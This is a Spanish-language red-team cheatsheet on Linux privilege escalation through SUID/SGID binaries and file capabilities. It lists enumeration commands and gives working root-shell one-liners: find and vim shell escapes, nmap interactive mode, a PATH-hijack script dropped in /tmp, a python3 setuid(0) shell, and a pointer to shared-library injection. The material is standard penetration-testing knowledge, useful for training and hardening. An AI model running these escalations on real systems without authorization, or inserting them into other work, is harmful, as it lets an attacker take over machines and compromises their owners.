---
aliases:
  - "Abusing SUID Binary"
  - "SUID"
  - "SGID"
  - "Abusing SUID & SGID Binaries"
  - "SUID"
  - "SGID"
  - SUID
  - SGID
  - Linux SUID
tags:
  - type/cheatsheet
  - env/linux
  - technique/privilege-escalation
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Explotación]]"
tertiary categories:
  - "[[Privilege Escalation]]"
kind: CheatSheet
linked:
  - "[[Linux Privilege Escalation]]"
---
# Linux PrivEsc - SUID y SGID

***

## Cheatsheet

| **Técnica**                        | **Comando**                                                                                        | **Uso**                                                                    |
| ---------------------------------- | -------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- |
| **Listar binarios SUID**           | `find / -perm -4000 -type f 2>/dev/null`                                                           | Enumera binarios con bit SUID activo.                                      |
| **Listar SGID**                    | `find / -perm -2000 -type f 2>/dev/null`                                                           | SGID ejecuta con privilegios del grupo propietario.                        |
| **Listar SUID + SGID combinado**   | `find / -perm -u=s -o -perm -g=s -type f 2>/dev/null`                                              | Barrido completo.                                                          |
| **Ver capabilities**               | `getcap -r / 2>/dev/null`                                                                          | `cap_setuid+ep` en intérpretes = root instantáneo.                         |
| **Explotar SUID conocido**         | [GTFOBins](https://gtfobins.github.io/) → binario + SUID                                           | Shell escape pre-construido (nmap, vim, find, bash, cp, less, more).       |
| **SUID custom con string relativa** | `strings /path/to/suid_bin \| grep -iE 'exec\|system\|popen'`                                      | Buscar comandos sin path absoluto → PATH hijack.                           |
| **Trace custom SUID**              | `ltrace /path/to/suid_bin` / `strace -f /path/to/suid_bin 2>&1 \| grep -iE 'exec\|open'`           | Ver syscalls y libc calls para identificar programas internos invocados.   |
| **SUID shared library hijacking**  | `ldd /path/to/suid_bin` + lib no estándar en dir escribible                                        | Si carga librerías de path controlable, inyectar `.so` malicioso.          |

^linux-privesc-suid

## Explotación típica

### 1. Binario SUID en GTFOBins

```bash
# Ejemplo: find con SUID
find . -exec /bin/bash -p \; -quit
# Ejemplo: vim con SUID
vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-p")'
# Ejemplo: nmap con SUID (version antigua)
nmap --interactive
nmap> !sh
```

### 2. PATH hijack en SUID custom

```bash
# Supongamos que /usr/local/bin/suid_bin llama a `cat` sin path absoluto
cd /tmp
echo '#!/bin/bash
/bin/bash -p' > cat
chmod +x cat
export PATH=/tmp:$PATH
/usr/local/bin/suid_bin
```

### 3. Capability cap_setuid+ep

```bash
getcap -r / 2>/dev/null
# /usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash")'
```

## Notas clave

- **`-p` es obligatorio en `bash`**: sin `-p`, bash descarta UID efectivo > UID real y no mantiene root.
- El bit SUID **no escala** en binarios que llaman `setuid(0)` si `no_new_privs` está activo (systemd hardening moderno).
- Algunos file systems (NFS, VFAT) ignoran el bit SUID — útil saber al pivotar entre mounts.
- Siempre verificar que el binario ejecute como el dueño: `ls -la /path/bin` → owner root + `rwsr-xr-x`.

***
